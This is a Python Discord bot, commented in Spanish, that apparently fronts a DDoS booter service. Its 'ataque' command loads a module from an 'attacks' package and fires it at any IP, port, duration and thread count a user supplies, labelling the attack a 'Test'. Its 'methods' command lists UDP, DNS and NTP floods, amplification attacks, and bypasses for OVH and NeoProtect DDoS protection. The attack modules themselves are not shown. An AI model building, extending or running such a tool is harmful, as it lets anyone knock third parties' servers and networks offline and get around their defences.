import discord
from discord.ext import commands
import importlib
import os
from config import PREFIX, TOKEN_FILE

# Cargar el token desde el archivo
def load_token():
    with open(TOKEN_FILE, 'r') as file:
        return file.read().strip()

# Inicializar el bot con intents
intents = discord.Intents.default()
intents.message_content = True  # Necesario para leer el contenido de los mensajes
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# Evento de inicio del bot
@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')

# Comando para cargar y ejecutar ataques
@bot.command()
async def ataque(ctx, metodo: str, ip: str, port: int, time: int, threads: int = 10):
    try:
        module = importlib.import_module(f'attacks.{metodo.lower()}')
        await ctx.send(f'Iniciando Test 🚀\nIP: `{ip}`\nPuerto: `{port}`\nMétodo: `{metodo}`\nTiempo: `{time}s`\nHilos: `{threads}`')
        module.attack(ip, port, time, threads)
        await ctx.send(f'Ataque {metodo} completo')
    except ModuleNotFoundError:
        await ctx.send(f'El método {metodo} no está disponible')
    except Exception as e:
        await ctx.send(f'Error al ejecutar el ataque {metodo}: {e}')

@bot.command(name='methods')
async def methods(ctx):
    texto = """
    **Metodos de Ataque⚡**
    **udppps**
    **udpquery**
    **udpslow**
    **vseflood**
    **udpflood**
    **udppackets**
    **dnsflood**
    **ntpflood**
    **raknet**
    **ovh_bypass**
    **amp_ntp**
    **amp_dns**
    **ovh_amp**
    **amp_mix**
    **neoprotect_bypass**
    """
    await ctx.send(texto)

# Ejecutar el bot
bot.run(load_token())
